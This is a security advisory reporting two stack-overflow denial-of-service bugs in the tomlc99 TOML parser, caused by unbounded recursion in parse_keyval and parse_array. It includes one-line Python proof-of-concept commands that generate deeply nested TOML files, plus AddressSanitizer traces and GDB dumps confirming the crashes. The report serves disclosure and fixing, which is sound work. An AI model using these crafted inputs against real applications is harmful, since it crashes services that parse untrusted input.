tomlc99 — Stack Overflow via Uncontrolled Recursion in parse_keyval and parse_array

Summary
Two stack overflow vulnerabilities exist in tomlc99 (latest master) caused by uncontrolled recursion in the TOML parser. A crafted TOML file with deeply nested dotted keys or deeply nested arrays causes a stack overflow crash (segmentation fault), resulting in denial of service. Any application using tomlc99 to parse untrusted TOML input is affected.
Both vulnerabilities have been confirmed via AddressSanitizer and independently reproduced in GDB without sanitizers (using ulimit -s 1024 to set a 1MB stack, typical of threaded applications).

Vulnerability 1: Stack overflow in parse_keyval via deeply nested dotted keys:

The function parse_keyval() at toml.c:1138 calls itself recursively when processing dotted keys (e.g., a.b.c = 1). There is no limit on recursion depth. A TOML input with thousands of dot-separated key segments causes the call stack to grow until it overflows.

POC 1:python3 -c "print('a' + '.b'*200000 + ' = 1')" > /tmp/poc1-deep.toml
      ./fuzz_toml_gdb /tmp/poc1-deep.toml; echo "Exit: $?"   # Expected: Exit: 139 (SIGSEGV)

ASAN:
./fuzz_toml_asan /tmp/poc1-deep.toml 2>&1 | head -20
AddressSanitizer:DEADLYSIGNAL
=================================================================
==2513149==ERROR: AddressSanitizer: stack-overflow on address 0x7ffc1e49dff8 (pc 0x7f0124d9cf1d bp 0x000000000010 sp 0x7ffc1e49e000 T0)
    #0 0x7f0124d9cf1c in __sanitizer::atomic_uint16_t::Type __sanitizer::atomic_load<__sanitizer::atomic_uint16_t>(__sanitizer::atomic_uint16_t const volatile*, __sanitizer::memory_order) ../../../../src/libsanitizer/sanitizer_common/sanitizer_atomic_clang_x86.h:45
    #1 0x7f0124d9cf1c in __sanitizer::atomic_uint16_t::Type __sanitizer::atomic_load<__sanitizer::atomic_uint16_t>(__sanitizer::atomic_uint16_t const volatile*, __sanitizer::memory_order) ../../../../src/libsanitizer/sanitizer_common/sanitizer_atomic_clang_x86.h:26
    #2 0x7f0124d9cf1c in __asan::Allocator::ComputeRZLog(unsigned long) ../../../../src/libsanitizer/asan/asan_allocator.cc:354
    #3 0x7f0124d9cf1c in __asan::Allocator::Allocate(unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType, bool) ../../../../src/libsanitizer/asan/asan_allocator.cc:423
    #4 0x7f0124d9954a in __asan::asan_malloc(unsigned long, __sanitizer::BufferedStackTrace*) ../../../../src/libsanitizer/asan/asan_allocator.cc:874
    #5 0x7f0124e7e8ce in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:145
    #6 0x55fbc55714f3 in STRNDUP /home/kali/vuln-research/targets/tomlc99/toml.c:85
    #7 0x55fbc5575ac3 in normalize_key /home/kali/vuln-research/targets/tomlc99/toml.c:681
    #8 0x55fbc5576298 in create_keytable_in_table /home/kali/vuln-research/targets/tomlc99/toml.c:782
    #9 0x55fbc557d016 in parse_keyval /home/kali/vuln-research/targets/tomlc99/toml.c:1132
    #10 0x55fbc557cfe8 in parse_keyval /home/kali/vuln-research/targets/tomlc99/toml.c:1138
    #11 0x55fbc557cfe8 in parse_keyval /home/kali/vuln-research/targets/tomlc99/toml.c:1138
    #12 0x55fbc557cfe8 in parse_keyval /home/kali/vuln-research/targets/tomlc99/toml.c:1138
    #13 0x55fbc557cfe8 in parse_keyval /home/kali/vuln-research/targets/tomlc99/toml.c:1138
    #14 0x55fbc557cfe8 in parse_keyval /home/kali/vuln-research/targets/tomlc99/toml.c:1138
    #15 0x55fbc557cfe8 in parse_keyval /home/kali/vuln-research/targets/tomlc99/toml.c:1138
    #16 0x55fbc557cfe8 in parse_keyval /home/kali/vuln-research/targets/tomlc99/toml.c:1138

GDB
ulimit -s 1024
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x19              
$rbx   : 0x0               
$rcx   : 0x0000555555560010  →  0x0000000000000000
$rdx   : 0x0               
$rsp   : 0x00007fffffeff000  →  0x0000000000000002
$rbp   : 0x2               
$rsi   : 0x2               
$rdi   : 0x00007ffff7fb0b80  →  0x0000000000000000
$rip   : 0x00007ffff7e5ba89  →  <_int_malloc+25> push rbx
$r8    : 0x1               
$r9    : 0x00007ffff7fb0c00  →  0x00007ffff7fb0bf0  →  0x00007ffff7fb0be0  →  0x00005555556a5cb0  →  0x0000000000000000
$r10   : 0x0000555555688000  →  0x0000555555687fc0  →  0x0000000000000062 ("b"?)
$r11   : 0x3               
$r12   : 0xffffffffffffffb0
$r13   : 0x00007fffffffe070  →  0x0000000000000002
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffeff000│+0x0000: 0x0000000000000002	 ← $rsp
0x00007fffffeff008│+0x0008: 0xffffffffffffffb0
0x00007fffffeff010│+0x0010: 0x00007fffffffe070  →  0x0000000000000002
0x00007fffffeff018│+0x0018: 0x0000000000000000
0x00007fffffeff020│+0x0020: 0x0000000000000000
0x00007fffffeff028│+0x0028: 0x00007ffff7e5e154  →  <malloc+116> mov r8, rax
0x00007fffffeff030│+0x0030: 0x00005555555c3310  →  "a.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.b.[...]"
0x00007fffffeff038│+0x0038: 0x00007fffffeff070  →  0x00007fffffeff120  →  0x00007fffffeff1d0  →  0x00007fffffeff260  →  0x00007fffffeff2f0  →  0x00007fffffeff380  →  0x00007fffffeff410
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e5ba83 <_int_malloc+19> push   r12
   0x7ffff7e5ba85 <_int_malloc+21> push   rbp
   0x7ffff7e5ba86 <_int_malloc+22> mov    rbp, rsi
 → 0x7ffff7e5ba89 <_int_malloc+25> push   rbx
   0x7ffff7e5ba8a <_int_malloc+26> mov    rbx, rdi
   0x7ffff7e5ba8d <_int_malloc+29> sub    rsp, 0x88
   0x7ffff7e5ba94 <_int_malloc+36> cmp    rax, 0x1f
   0x7ffff7e5ba98 <_int_malloc+40> ja     0x7ffff7e5bba0 <_int_malloc+304>
   0x7ffff7e5ba9e <_int_malloc+46> test   rdi, rdi


Vulnerability 2: Stack overflow in parse_array via deeply nested arrays
poc 2: python3 -c "print('a = ' + '['*100000 + '1' + ']'*100000)" > /tmp/poc2-deep.toml
       ./fuzz_toml_gdb /tmp/poc2-deep.toml; echo "Exit: $?"

./fuzz_toml_asan /tmp/poc2-deep.toml 2>&1 | head -20
AddressSanitizer:DEADLYSIGNAL
=================================================================
==2513164==ERROR: AddressSanitizer: stack-overflow on address 0x7ffd26803ff8 (pc 0x7f0dad433916 bp 0x000000000010 sp 0x7ffd26804000 T0)
    #0 0x7f0dad433915 in __sanitizer::CombinedAllocator<__sanitizer::SizeClassAllocator64<__asan::AP64>, __sanitizer::SizeClassAllocatorLocalCache<__sanitizer::SizeClassAllocator64<__asan::AP64> >, __sanitizer::LargeMmapAllocator<__asan::AsanMapUnmapCallback, __sanitizer::LargeMmapAllocatorPtrArrayDynamic> >::Allocate(__sanitizer::SizeClassAllocatorLocalCache<__sanitizer::SizeClassAllocator64<__asan::AP64> >*, unsigned long, unsigned long) ../../../../src/libsanitizer/sanitizer_common/sanitizer_allocator_combined.h:37
    #1 0x7f0dad433ffe in __asan::Allocator::Allocate(unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType, bool) ../../../../src/libsanitizer/asan/asan_allocator.cc:451
    #2 0x7f0dad43054a in __asan::asan_malloc(unsigned long, __sanitizer::BufferedStackTrace*) ../../../../src/libsanitizer/asan/asan_allocator.cc:874
    #3 0x7f0dad5158ce in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:145
    #4 0x55a2e5624307 in expand /home/kali/vuln-research/targets/tomlc99/toml.c:411
    #5 0x55a2e562443e in expand_arritem /home/kali/vuln-research/targets/tomlc99/toml.c:436
    #6 0x55a2e5630345 in create_array_in_array /home/kali/vuln-research/targets/tomlc99/toml.c:882
    #7 0x55a2e5630345 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1057
    #8 0x55a2e5630596 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1060
    #9 0x55a2e5630596 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1060
    #10 0x55a2e5630596 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1060
    #11 0x55a2e5630596 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1060
    #12 0x55a2e5630596 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1060
    #13 0x55a2e5630596 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1060
    #14 0x55a2e5630596 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1060
    #15 0x55a2e5630596 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1060
    #16 0x55a2e5630596 in parse_array /home/kali/vuln-research/targets/tomlc99/toml.c:1060

GDB:

Starting program: /home/kali/vuln-research/targets/tomlc99/fuzz_toml_gdb /tmp/poc2-deep.toml

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e5beb1 in _int_malloc (av=av@entry=0x7ffff7fb0b80 <main_arena>, bytes=bytes@entry=0x20) at malloc.c:3718
3718	malloc.c: No such file or directory.

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007ffff7fb0b80  →  0x0000000000000000
$rcx   : 0x00007ffff7fb0c00  →  0x00007ffff7fb0bf0  →  0x00007ffff7fb0be0  →  0x00005555556931a0  →  0x0000000000000000
$rdx   : 0x0               
$rsp   : 0x7fffffefeff0    
$rbp   : 0x20              
$rsi   : 0x00007ffff7fb0b88  →  0x0000000000000000
$rdi   : 0x5b              
$rip   : 0x00007ffff7e5beb1  →  <_int_malloc+1089> mov QWORD PTR [rsp+0x8], rax
$r8    : 0x00007ffff7fb0c00  →  0x00007ffff7fb0bf0  →  0x00007ffff7fb0be0  →  0x00005555556931a0  →  0x0000000000000000
$r9    : 0x00005555555c2f20  →  0x0000000000000000
$r10   : 0x000055555568a000  →  0x0000000000000000
$r11   : 0x00007ffff7fb0be0  →  0x00005555556931a0  →  0x0000000000000000
$r12   : 0xffffffffffffffb0
$r13   : 0x30              
$r14   : 0x3               
$r15   : 0x1               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
[!] Unmapped address: '0x7fffffefeff0'
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e5bea8 <_int_malloc+1080> shr    rax, 0x4
   0x7ffff7e5beac <_int_malloc+1084> mov    r15, rax
   0x7ffff7e5beaf <_int_malloc+1087> xor    eax, eax
 → 0x7ffff7e5beb1 <_int_malloc+1089> mov    QWORD PTR [rsp+0x8], rax
   0x7ffff7e5beb6 <_int_malloc+1094> cmp    QWORD PTR fs:[r12], 0x0
   0x7ffff7e5bebc <_int_malloc+1100> je     0x7ffff7e5bece <_int_malloc+1118>
   0x7ffff7e5bebe <_int_malloc+1102> cmp    QWORD PTR [rip+0x15440b], r15        # 0x7ffff7fb02d0 <mp_+80>
   0x7ffff7e5bec5 <_int_malloc+1109> cmova  rax, r13
   0x7ffff7e5bec9 <_int_malloc+1113> mov    QWORD PTR [rsp+0x8], rax
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fuzz_toml_gdb", stopped 0x7ffff7e5beb1 in _int_malloc (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7e5beb1 → _int_malloc(av=0x7ffff7fb0b80 <main_arena>, bytes=0x20)
[#1] 0x7ffff7e5e154 → __GI___libc_malloc(bytes=0x20)
[#2] 0x555555555e51 → expand(p=0x0, sz=0x0, newsz=0x20)
[#3] 0x555555555f67 → expand_arritem(p=0x0, n=0x0)
[#4] 0x55555555700d → create_array_in_array(ctx=0x7fffffffdc60, parent=0x555555693180)
[#5] 0x55555555768e → parse_array(ctx=0x7fffffffdc60, arr=0x555555693180)
[#6] 0x5555555576b6 → parse_array(ctx=0x7fffffffdc60, arr=0x555555693120)
[#7] 0x5555555576b6 → parse_array(ctx=0x7fffffffdc60, arr=0x5555556930c0)
[#8] 0x5555555576b6 → parse_array(ctx=0x7fffffffdc60, arr=0x555555693060)
[#9] 0x5555555576b6 → parse_array(ctx=0x7fffffffdc60, arr=0x555555693000)
